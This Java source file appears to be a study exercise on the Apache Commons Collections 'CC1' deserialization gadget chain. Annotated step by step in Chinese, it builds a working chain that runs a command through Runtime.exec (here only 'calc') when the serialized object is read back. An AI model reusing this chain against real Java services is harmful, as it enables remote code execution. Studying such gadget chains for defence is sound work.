package com.mechoy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class CC1Test {

    /**
     * Title: CC1分析学习
     * <br/>
     * jdk: 1.8.0_65-b17
     */
    final static String path = "ser.bin";

    public static void main(String[] args) throws Exception {
        /*
         * 危险方法
         * org.apache.commons.collections.functors.InvokerTransformer#transform()
         */
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});


        /*
         * 不使用 ChainedTransformer 将 Runtime变成可以序列化的

        */

        // 使用 ChainedTransformer
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        });

        /*
         * 调用链1
         * org.apache.commons.collections.map.TransformedMap#checkSetValue()
         */
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","kkk");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, (Transformer) chainedTransformer);

        /*
         * 调用链2
         * org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue
         * map在传入transformedMap时size不能为0
         */
        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aih.getDeclaredConstructor(Class.class,Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, transformedMap);

        /*
         * 调用链3
         * sun.reflect.annotation.AnnotationInvocationHandler.readObject
         */
        serialize(o);

        deserialize();
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
